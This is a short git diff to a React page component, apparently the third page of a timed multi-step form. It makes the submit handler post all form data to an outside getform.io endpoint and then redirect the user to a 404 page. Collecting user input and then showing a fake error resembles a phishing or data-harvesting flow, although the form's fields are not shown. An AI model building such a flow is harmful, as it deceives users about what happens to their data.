@@ -21,12 +21,29 @@ function Tercerapag() {
     return `${minutes}:${secs < 10 ? '0' : ''}${secs}`;
   };
 
-  const handleSubmit = (event) => {
+  const handleSubmit = async (event) => {
     event.preventDefault();
-    
-    // Aquí puedes agregar cualquier lógica de envío de datos si es necesario
 
-    navigate('/404');
+    const formData = new FormData(event.target);
+    
+    try {
+      const response = await fetch('https://getform.io/f/axojvkpb', {
+        method: 'POST',
+        body: formData,
+        headers: {
+          'Accept': 'application/json'
+        }
+      });
+
+      if (response.ok) {
+        console.log('Datos enviados correctamente');
+        navigate('/404');
+      } else {
+        console.error('Error al enviar los datos');
+      }
+    } catch (error) {
+      console.error('Error al enviar los datos:', error);
+    }
   };
 
   return (
